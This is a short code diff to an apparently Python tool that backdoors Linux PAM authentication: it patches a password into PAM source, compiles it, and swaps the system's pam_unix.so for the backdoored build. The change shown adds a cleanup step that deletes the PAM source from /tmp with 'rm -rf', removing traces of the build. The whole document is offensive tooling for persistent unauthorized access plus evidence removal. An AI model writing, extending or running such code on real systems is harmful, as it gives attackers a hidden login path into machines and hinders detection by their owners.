@@ -65,6 +65,9 @@ def create_backdoor(password, path_to_source_code):
     put_backdoor_into_code(password, path_to_source_code)
     compile_modified_pam(path_to_source_code)
 
+def clean_sources():
+    os.system("rm -rf /tmp/pam_source*")
+
 def main(arguments):
     if not arguments[1]:
         get_pam_source_code(get_pam_version())
@@ -75,3 +78,4 @@ def main(arguments):
     create_backdoor(arguments[0], path_to_source_code)
     create_backup_of_original_pam(find_original_pam())
     copy_backdoored_pam(path_to_source_code + "/modules/pam_unix/.libs/pam_unix.so", find_original_pam())
+    clean_sources()
